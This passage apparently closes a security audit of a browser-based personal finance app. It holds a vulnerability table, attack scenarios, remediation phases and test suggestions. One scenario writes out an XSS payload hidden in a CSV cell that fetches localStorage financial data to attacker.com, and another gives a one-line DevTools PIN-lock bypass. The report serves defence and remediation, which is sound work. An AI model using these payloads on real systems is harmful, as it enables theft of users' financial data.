        this.calls = [];
    }

    async call(fn) {
        const now = Date.now();
        this.calls = this.calls.filter(t => now - t < this.windowMs);

        if (this.calls.length >= this.maxCalls) {
            const oldestCall = this.calls[0];
            const waitTime = this.windowMs - (now - oldestCall);
            throw new Error(`Rate limit exceeded. Wait ${waitTime}ms`);
        }

        this.calls.push(now);
        return fn();
    }
}

// Usage
const apiLimiter = new RateLimiter(10, 60000);  // 10 calls per minute

async fetchLivePrices() {
    try {
        await apiLimiter.call(() => this.fetchCryptoPrices());
        await apiLimiter.call(() => this.fetchEquityPrices());
    } catch (e) {
        this.toast('API rate limit: ' + e.message, true);
    }
}
```

**Priority:** NICE-TO-HAVE

---

## VULNERABILITY SUMMARY TABLE

| ID | Title | Severity | CVSS | Category | Line(s) | Status |
|---|---|---|---|---|---|---|
| SEC-001 | innerHTML XSS via CSV Import | CRITICAL | 9.8 | XSS | 36552 | OPEN |
| SEC-002 | innerHTML XSS via Equity/Crypto Rendering | CRITICAL | 9.8 | XSS | 23097-23141 | OPEN |
| SEC-003 | innerHTML XSS via Portfolio Names | HIGH | 8.2 | XSS | 21567, 21718 | OPEN |
| SEC-004 | innerHTML XSS via Version Names | HIGH | 8.0 | XSS | 40467-40495 | OPEN |
| SEC-005 | innerHTML XSS via Modal Content | MEDIUM | 6.5 | XSS | Multiple | OPEN |
| SEC-006 | PIN Hash Stored in Plaintext localStorage | CRITICAL | 9.6 | Auth | 28908-28920 | OPEN |
| SEC-007 | Hardcoded Salt in PIN Hash | HIGH | 8.1 | Auth | 28870-28903 | OPEN |
| SEC-008 | PIN Lock Screen Bypassable via DevTools | CRITICAL | 9.7 | Auth | 28957-28972 | OPEN |
| SEC-009 | No PIN Attempt Rate Limiting (Offline) | CRITICAL | 9.5 | Auth | 29006-29050 | OPEN |
| SEC-010 | All Financial Data Plaintext in localStorage | CRITICAL | 9.9 | Data Exposure | 21493-21560 | OPEN |
| SEC-011 | Finnhub API Key in Plaintext | CRITICAL | 9.8 | Data Exposure | 22881, 23003 | OPEN |
| SEC-012 | Exchange Rate API Keys Unencrypted | MEDIUM | 6.5 | Data Exposure | 35914-35915 | OPEN |
| SEC-013 | Service Worker Caches Sensitive Data | HIGH | 8.4 | Data Exposure | 29830-29848 | OPEN |
| SEC-014 | CSV Formula Injection (Excel) | HIGH | 7.8 | Injection | 29279-29350 | OPEN |
| SEC-015 | JSON Injection via Backup Restore | CRITICAL | 9.7 | Injection | 40400-40430 | OPEN |
| SEC-016 | No Content Security Policy (CSP) | CRITICAL | 9.4 | Network | 1-100 | OPEN |
| SEC-017 | No Subresource Integrity (SRI) | MEDIUM | 5.3 | Network | 42 | OPEN |
| SEC-018 | Open CORS Proxies Used | HIGH | 7.5 | Network | 22837-22844 | OPEN |
| SEC-019 | Privacy Mode Only Hides via CSS | MEDIUM | 6.0 | Privacy | Multiple | OPEN |
| SEC-020 | Plaintext Data in Browser Memory | MEDIUM | 6.2 | Privacy | Global | OPEN |
| SEC-021 | Weak Biometric Implementation | HIGH | 7.9 | Auth | 29180-29230 | OPEN |
| SEC-022 | No Rate Limiting on API Calls | MEDIUM | 5.8 | DoS | 22640-23000 | OPEN |

---

## CRITICAL FINDINGS

**22 vulnerabilities identified:**
- 10 CRITICAL (CVSSv3 9.0+)
- 8 HIGH (CVSS 7.0-8.9)
- 4 MEDIUM (CVSS 4.0-6.9)

**Attack Scenarios:**

### Scenario 1: Complete Data Theft
1. Open DevTools
2. Read `localStorage.getItem('dfc_data_v3_default')`
3. Copy entire portfolio data (plaintext JSON)
4. Parse and analyze offline
5. Complete financial picture compromised

**Time to exploit:** < 10 seconds
**Required access:** Physical device access OR browser console injection via XSS

---

### Scenario 2: PIN Bypass
1. Open DevTools (F12)
2. Run: `document.getElementById('pin-lock-screen').remove()`
3. App is instantly unlocked
4. Full access to financial dashboard

**Time to exploit:** < 5 seconds
**Required access:** Physical device access

---

### Scenario 3: XSS + Data Exfiltration
1. Create malicious CSV: `Symbol,Qty,"<img src=x onerror='fetch(https://attacker.com/steal?data='+btoa(localStorage.getItem('dfc_data_v3_default'))+')'/>"`
2. User imports CSV in app
3. XSS payload executes
4. Financial data POSTed to attacker server

**Time to exploit:** Milliseconds after import
**Required access:** Social engineering (get user to import file)

---

### Scenario 4: API Key Compromise
1. Extract `localStorage.getItem('finnhub_key')`
2. Use key to make unlimited API calls
3. Exhaust user's free quota
4. Access historical price data

**Time to exploit:** < 10 seconds
**Required access:** Browser console access

---

## REMEDIATION PRIORITIES

### Phase 1: CRITICAL (DO BEFORE DEPLOYING)
1. **SEC-010**: Encrypt all financial data at rest
2. **SEC-008**: Implement encryption-based PIN protection (data only accessible after PIN decryption)
3. **SEC-016**: Add CSP headers to prevent XSS
4. **SEC-001, SEC-002, SEC-003, SEC-004**: Implement HTML escaping for all user inputs
5. **SEC-011**: Encrypt or server-side proxy all API keys
6. **SEC-015**: Validate backup structure and sanitize all imported data
7. **SEC-006, SEC-007, SEC-009**: Redesign PIN security with proper salting and rate limiting

### Phase 2: HIGH (DO WITHIN 1 WEEK)
1. **SEC-013**: Stop caching sensitive API responses
2. **SEC-018**: Replace CORS proxies with server-side proxy
3. **SEC-014**: Sanitize CSV formula injection
4. **SEC-021**: Fix biometric implementation with server-side validation
5. **SEC-005**: Audit remaining innerHTML usage

### Phase 3: MEDIUM (DO WITHIN 1 MONTH)
1. **SEC-012**: Encrypt all API credentials
2. **SEC-017**: Add SRI to external resources
3. **SEC-019**: Implement proper privacy data hiding
4. **SEC-020**: Encapsulate sensitive data to prevent console inspection
5. **SEC-022**: Add rate limiting to API calls

---

## ARCHITECTURAL RECOMMENDATIONS

1. **Data Protection Architecture**
   ```
   User Input → Validation → HTML Escape → Encrypt (AES-256-GCM) → Store in IndexedDB
   Retrieve from Storage → Decrypt (with PIN-derived key) → Decompress → Render
   ```

2. **API Security**
   ```
   Client ──────────────────────→ Your Server ──→ Finnhub/CoinGecko API
                                   (Your server handles auth, caching, rate limiting)
   ```

3. **PIN Security (Client-Only)**
   ```
   User enters PIN → Derive key using PBKDF2 (100,000 iterations) → Use to decrypt data
   If PIN wrong → Can't decrypt → No access to data
   ```

4. **Content Security**
   ```
   <meta http-equiv="Content-Security-Policy" content="
       default-src 'self';
       script-src 'self';
       style-src 'self' https://fonts.googleapis.com;
       ...
   ">
   ```

---

## TESTING RECOMMENDATIONS

1. **Penetration Testing**
   - Red team exercise: Can attacker extract financial data?
   - DevTools bypass testing
   - CSV injection testing

2. **Automated Testing**
   ```javascript
   // Test 1: XSS in CSV import
   const maliciousCSV = 'Symbol,Qty\n<img src=x onerror="throw new Error(\'XSS\')">,100';
   App.parseCSV(maliciousCSV);  // Should NOT throw

   // Test 2: PIN bypass via DevTools
   document.getElementById('pin-lock-screen').remove();
   // Should NOT grant access to data

   // Test 3: Plaintext data check
   const stored = localStorage.getItem('dfc_data_v3_default');
   // Should NOT contain readable financial data
   ```

3. **Manual Testing**
   - Verify CSP is enforced (inject script, should block)
   - Verify API keys are not logged
   - Verify encrypted data cannot be read without PIN

---

## DEPLOYMENT CHECKLIST

- [ ] All innerHTML replaced with textContent or escaped HTML
- [ ] CSP headers implemented and tested
- [ ] Financial data encrypted at rest (AES-256-GCM)
- [ ] API keys encrypted or server-side proxied
- [ ] PIN protection redesigned with PBKDF2 and random salt
- [ ] Service worker stops caching sensitive data
- [ ] CSV import sanitized for formula injection
- [ ] Backup restore validates and sanitizes data
- [ ] Biometric auth uses server-side validation (if applicable)
- [ ] All 22 vulnerabilities have remediation PRs
- [ ] Security tests added to CI/CD pipeline
- [ ] Third-party security audit completed

---

## CONCLUSION

**This application is NOT SAFE for production use with real financial data in its current state.**

The combination of:
- Complete lack of CSP/XSS protection
- Plaintext storage of all financial data
- Trivial PIN bypass via DevTools
- Unencrypted API keys and credentials
- Multiple injection vulnerabilities

...means that any attacker with browser access (physical device, malware, compromised browser extension, or XSS from another site) can extract complete financial information in seconds.

**Immediate action required:** Do not allow users to store real financial data until Phases 1 remediation is complete.

**Recommended next steps:**
1. Implement encryption for financial data (SEC-010) - this is the foundation
2. Add CSP headers (SEC-016) - prevents XSS exploitation
3. Fix PIN security (SEC-006, SEC-008, SEC-009) - prevents trivial access
4. Escape all innerHTML (SEC-001 through SEC-005) - prevents injection attacks

All 22 vulnerabilities are fixable. Many have complete code samples provided above. Budget 4-6 weeks for comprehensive remediation and testing.
